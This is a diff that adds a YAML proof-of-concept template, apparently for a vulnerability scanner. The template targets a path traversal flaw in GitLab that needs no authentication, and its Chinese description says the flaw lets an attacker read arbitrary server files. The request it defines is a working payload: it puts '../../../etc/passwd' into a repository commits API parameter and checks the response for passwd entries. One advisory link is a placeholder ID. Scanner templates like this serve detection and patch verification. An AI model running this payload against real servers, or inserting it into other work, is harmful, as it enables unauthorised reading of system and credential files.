@@ -1,0 +1,15 @@
+name: poc-yaml-gitlab-path-traversal
+groups:
+  fileread:
+    - method: GET
+      path: /api/v4/projects/1/repository/commits?ref_name=master&path=../../../etc/passwd
+      follow_redirects: false
+      expression: >
+        response.status == 200 && (response.body.bcontains(b"root:") || response.body.bcontains(b"nobody:"))
+detail:
+  author: L4xy
+  description: "GitLab CE/EE 存在路径遍历漏洞，攻击者无需身份验证，通过构造恶意的仓库提交API请求可读取服务器上的任意文件"
+  links:
+    - https://github.com/gitlabhq/gitlabhq/security/advisories/GHSA-xxxx
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-85706
+  tags: path-traversal,fileread,gitlab
